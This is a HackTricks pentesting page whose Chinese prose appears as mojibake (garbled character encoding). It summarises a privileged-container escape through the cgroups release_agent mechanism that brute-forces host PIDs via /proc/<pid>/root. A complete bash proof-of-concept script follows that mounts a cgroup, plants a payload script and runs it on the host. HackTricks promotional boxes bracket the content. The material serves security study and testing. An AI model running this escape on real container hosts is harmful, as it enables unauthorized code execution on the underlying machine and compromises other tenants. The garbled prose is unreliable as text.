<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFç‰ˆHackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

è¦äº†è§£æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹æ¥è‡ª[https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)çš„åšå®¢æ–‡ç« ã€‚è¿™åªæ˜¯ä¸€ä¸ªæ‘˜è¦ï¼š

è¯¥æŠ€æœ¯æ¦‚è¿°äº†ä¸€ç§**ä»å®¹å™¨å†…éƒ¨æ‰§è¡Œä¸»æœºä»£ç **çš„æ–¹æ³•ï¼Œå…‹æœäº†å­˜å‚¨é©±åŠ¨ç¨‹åºé…ç½®å¸¦æ¥çš„æŒ‘æˆ˜ï¼Œè¿™äº›é…ç½®ä¼šéšè—å®¹å™¨åœ¨ä¸»æœºä¸Šçš„æ–‡ä»¶ç³»ç»Ÿè·¯å¾„ï¼Œä¾‹å¦‚Kata Containersæˆ–ç‰¹å®šçš„`devicemapper`è®¾ç½®ã€‚

å…³é”®æ­¥éª¤ï¼š

1. **å®šä½è¿›ç¨‹IDï¼ˆPIDsï¼‰ï¼š** ä½¿ç”¨Linuxä¼ªæ–‡ä»¶ç³»ç»Ÿä¸­çš„`/proc/<pid>/root`ç¬¦å·é“¾æ¥ï¼Œå¯ä»¥ç›¸å¯¹äºä¸»æœºçš„æ–‡ä»¶ç³»ç»Ÿè®¿é—®å®¹å™¨ä¸­çš„ä»»ä½•æ–‡ä»¶ã€‚è¿™æ ·å¯ä»¥ç»•è¿‡åœ¨ä¸»æœºä¸Šäº†è§£å®¹å™¨æ–‡ä»¶ç³»ç»Ÿè·¯å¾„çš„éœ€æ±‚ã€‚
2. **PIDçŒœæµ‹ï¼š** é‡‡ç”¨æš´åŠ›æœç´¢æ–¹æ³•åœ¨ä¸»æœºä¸Šæœç´¢PIDã€‚è¿™æ˜¯é€šè¿‡é¡ºåºæ£€æŸ¥`/proc/<pid>/root/<file>`ä¸­ç‰¹å®šæ–‡ä»¶çš„å­˜åœ¨æ¥å®Œæˆçš„ã€‚å½“æ‰¾åˆ°æ–‡ä»¶æ—¶ï¼Œè¡¨ç¤ºç›¸åº”çš„PIDå±äºè¿è¡Œåœ¨ç›®æ ‡å®¹å™¨å†…éƒ¨çš„è¿›ç¨‹ã€‚
3. **è§¦å‘æ‰§è¡Œï¼š** çŒœæµ‹çš„PIDè·¯å¾„è¢«å†™å…¥`cgroups release_agent`æ–‡ä»¶ã€‚æ­¤æ“ä½œè§¦å‘`release_agent`çš„æ‰§è¡Œã€‚é€šè¿‡æ£€æŸ¥æ˜¯å¦åˆ›å»ºäº†è¾“å‡ºæ–‡ä»¶æ¥ç¡®è®¤æ­¤æ­¥éª¤çš„æˆåŠŸã€‚

### åˆ©ç”¨è¿‡ç¨‹

åˆ©ç”¨è¿‡ç¨‹æ¶‰åŠä¸€ç³»åˆ—æ›´è¯¦ç»†çš„æ“ä½œï¼Œæ—¨åœ¨é€šè¿‡çŒœæµ‹è¿è¡Œåœ¨å®¹å™¨å†…éƒ¨çš„è¿›ç¨‹çš„æ­£ç¡®PIDï¼Œåœ¨ä¸»æœºä¸Šæ‰§è¡Œæœ‰æ•ˆè½½è·ã€‚ä»¥ä¸‹æ˜¯æ“ä½œæ­¥éª¤ï¼š

1. **åˆå§‹åŒ–ç¯å¢ƒï¼š** åœ¨ä¸»æœºä¸Šå‡†å¤‡ä¸€ä¸ªæœ‰æ•ˆè½½è·è„šæœ¬ï¼ˆ`payload.sh`ï¼‰ï¼Œå¹¶ä¸ºcgroupæ“ä½œåˆ›å»ºä¸€ä¸ªå”¯ä¸€ç›®å½•ã€‚
2. **å‡†å¤‡æœ‰æ•ˆè½½è·ï¼š** ç¼–å†™åŒ…å«è¦åœ¨ä¸»æœºä¸Šæ‰§è¡Œçš„å‘½ä»¤çš„æœ‰æ•ˆè½½è·è„šæœ¬ï¼Œå¹¶ä½¿å…¶å¯æ‰§è¡Œã€‚
3. **è®¾ç½®Cgroupï¼š** æŒ‚è½½å’Œé…ç½®cgroupã€‚è®¾ç½®`notify_on_release`æ ‡å¿—ä»¥ç¡®ä¿åœ¨é‡Šæ”¾cgroupæ—¶æ‰§è¡Œæœ‰æ•ˆè½½è·ã€‚
4. **æš´åŠ›ç ´è§£PIDï¼š** å¾ªç¯éå†æ½œåœ¨çš„PIDï¼Œå°†æ¯ä¸ªçŒœæµ‹çš„PIDå†™å…¥`release_agent`æ–‡ä»¶ã€‚è¿™å®é™…ä¸Šå°†æœ‰æ•ˆè½½è·è„šæœ¬è®¾ç½®ä¸º`release_agent`ã€‚
5. **è§¦å‘å’Œæ£€æŸ¥æ‰§è¡Œï¼š** å¯¹äºæ¯ä¸ªPIDï¼Œå°†cgroupçš„`cgroup.procs`å†™å…¥ï¼Œå¦‚æœPIDæ­£ç¡®ï¼Œåˆ™è§¦å‘`release_agent`çš„æ‰§è¡Œã€‚å¾ªç¯å°†ç»§ç»­ï¼Œç›´åˆ°æ‰¾åˆ°æœ‰æ•ˆè½½è·è„šæœ¬çš„è¾“å‡ºï¼Œè¡¨ç¤ºæˆåŠŸæ‰§è¡Œã€‚

åšå®¢æ–‡ç« ä¸­çš„PoCï¼š
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
